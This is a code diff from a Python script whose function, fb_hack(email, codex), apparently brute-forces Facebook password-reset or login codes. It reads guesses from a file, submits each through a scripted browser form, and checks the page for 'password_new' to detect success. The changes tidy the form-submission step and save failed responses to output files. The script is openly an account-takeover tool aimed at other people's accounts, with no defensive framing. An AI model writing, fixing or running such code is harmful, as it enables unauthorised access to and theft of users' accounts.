@@ -126,16 +126,12 @@ def fb_hack(email, codex):
       browser.select_form(nr=0)
       y = f.readlines(attempt)
       attempt += 1
-      forms = list(browser.forms())
-      form = forms[0]
-      print(form)
-      browser.select_form(nr=0)
-      browser.set_value(str(y), nr=5)
-      forms = list(browser.forms())
-      form = forms[0]
-      print(form)
       try:
-        browser.form['n'] = y
+        browser.select_form(nr=0)
+        browser.set_value(str(y), nr=5)
+        """forms = list(browser.forms())
+        form = forms[0]
+        print(form)"""
         browser.submit()
         print(str(y), end='\r')
         fail = (y, "failed")
@@ -165,9 +161,13 @@ def fb_hack(email, codex):
       else:
         soup = BeautifulSoup(response1, 'html.parser')
         if soup.find(string="password_new") == test:
+          response1 = browser.response()
+          soup = BeautifulSoup(response1, 'html.parser')
+          with open("output1.html", "w") as file:
+            file.write(str(soup))
+          with open("output1.txt", "w") as file:
+            file.write(str(soup))
           print("Password not found")
-          print(browser.geturl())
-          print(browser.response())
           browser.close()
         else:
           print(s.join(success))
